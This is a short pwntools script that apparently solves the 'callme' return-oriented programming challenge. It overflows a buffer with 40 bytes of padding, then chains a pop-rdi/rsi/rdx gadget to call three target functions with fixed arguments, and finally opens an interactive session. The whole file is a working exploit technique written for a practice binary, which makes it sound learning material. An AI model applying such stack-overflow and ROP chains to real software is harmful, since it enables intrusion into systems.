from pwn import *

p = process('./callme')
e = ELF('./callme')

rop = ROP(e)

callme_one = 0x400720
callme_two = 0x400740
callme_three = 0x4006f0

GADGET = rop.find_gadget(['pop rdi', 'pop rsi', 'pop rdx', 'ret'])[0];

padding = b'A' * 40

arg1 = 0xdeadbeefdeadbeef
arg2 = 0xcafebabecafebabe
arg3 = 0xd00df00dd00df00d

args = p64(arg1) + p64(arg2) + p64(arg3)

# pop the arguments from the stack onto the appropriate registers (rdi, rsi, rdx)
# call the function
# repeat for each function call
payload1 = p64(GADGET) + args + p64(callme_one)
payload2 = p64(GADGET) + args + p64(callme_two)
payload3 = p64(GADGET) + args + p64(callme_three)

p.recvuntil(b'> ')

p.sendline(padding + payload1 + payload2 + payload3)
p.interactive()

